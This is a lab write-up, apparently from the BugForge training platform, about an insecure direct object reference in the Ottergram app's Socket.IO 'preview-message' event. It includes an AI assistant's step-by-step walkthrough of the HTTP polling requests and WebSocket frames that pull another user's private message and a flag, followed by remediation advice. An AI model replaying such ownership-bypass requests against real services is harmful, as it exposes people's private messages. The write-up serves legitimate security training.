---
title: Ottergram
tags:
  - bugforge
  - websockets
  - api-testing
  - burpsuite
  - mcp
  - idor
  - broken-access-control
---

- Today's lab brings us to the favourite otters :)
- As usual, we can register and check the page out

![Daily](/BugForge/img/otter-01.png)

- Continuing my methodology, I click through everything, send messages, like and comment.
- Next up, we move to Burp to inspect it all

![Daily](/BugForge/img/otter-02.png)


- I decided to focus on the websockets, as I checked other things, and it did not bring anything 
- Checking different APIs has not revealed anything either

![Daily](/BugForge/img/otter-03.png)



## MCP

- I have given all information from my enumeration to my MCP friend to check for multiple issues
- Providing all of the history to the MCP, allowed it narrow down the problem, however it still needed some fine tuning as it went on a spiral

![Daily](/BugForge/img/otter-04.png)


- Afterwards,  it was able to find the issue and walked me through its actions as well as the outcome

![Daily](/BugForge/img/otter-05.png)


### MCP Walkthrough using manual polling

Here’s exactly what I did in your new session, step‑by‑step, and what I saw.

  1) Identify an auth token

  - I pulled the token from your existing history (POST /api/register and GET /api/verify-token).
  - Token used: the one in your history for tester (already in your session).

  2) Start a Socket.IO polling session

```html
GET /socket.io/?EIO=4&transport=polling&t=codex1 HTTP/1.1
Host: lab-1768638544942-8i42y0.labs-app.bugforge.io

Response contained:

sid = aUep-CgMwIZPnL3nAAAK
```

  3) Authenticate the socket (send JWT)

 ```html
POST /socket.io/?EIO=4&transport=polling&sid=aUep-CgMwIZPnL3nAAAK HTTP/1.1
Host: lab-1768638544942-8i42y0.labs-app.bugforge.io
Content-Type: text/plain;charset=UTF-8

40{"token":"<JWT>"}

Server replied: ok
 ```

  4) Trigger the preview event

```html
POST /socket.io/?EIO=4&transport=polling&sid=aUep-CgMwIZPnL3nAAAK HTTP/1.1
Host: lab-1768638544942-8i42y0.labs-app.bugforge.io
Content-Type: text/plain;charset=UTF-8

42["preview-message",1]

Server replied: ok
```

5) Fetch the server response

```html
GET /socket.io/?EIO=4&transport=polling&sid=aUep-CgMwIZPnL3nAAAK HTTP/1.1
Host: lab-1768638544942-8i42y0.labs-app.bugforge.io

Server response contained:

42["message-preview",{"messageId":1,"preview":"bug{FEZJxsblZKZ1RTq7x9TSLZTEznepMHIf} Hey! I loved your recent otter post! Where did you take that photo?"}]
```


  - **Weakness confirmed**
	  - The preview-message Socket.IO event allows arbitrary messageId and returns the preview without verifying ownership. 
	  - That’s an `IDOR` over WebSockets.

### Websocket with Repeater (no manual polling)

  1) Ensure a socket exists

- In the browser, open the Messages page once.
- This creates a live Socket.IO connection.

  2) Open it in Burp

- Burp → Proxy → WebSockets history
- Find the newest entry for lab-1768638544942-8i42y0.labs-app.bugforge.io
- Right‑click → Send to Repeater (WebSocket)

  3) Send the preview event

- In WebSocket Repeater, send this frame:

`42["preview-message",1]`

  4) Read the response

- The server reply appears as a server → client message, e.g.:

`42["message-preview",{"messageId":1,"preview":"bug{...} ..."}]`


- Keep learning and Be Useful!

## Security Takeaways
### Impact

  - Unauthorized access to other users’ private message previews
  - Disclosure of sensitive content through WebSocket events
  - Confirms broken authorization in real‑time features

### Vulnerability Classification

  - OWASP Top 10: Broken Access Control
  - Vulnerability Type: IDOR over WebSockets
  - CWE: CWE-639 – Authorization Bypass Through User-Controlled Key

### Root Cause
  - The WebSocket handler trusts the client‑supplied messageId and returns previews without verifying that the authenticated user owns the message.

### Remediation

  - Enforce ownership checks for all WebSocket message events
  - Validate message access server‑side before sending previews
  - Apply consistent authorization logic across REST and WebSocket handlers
  - Add logging/monitoring for abnormal messageId access patterns
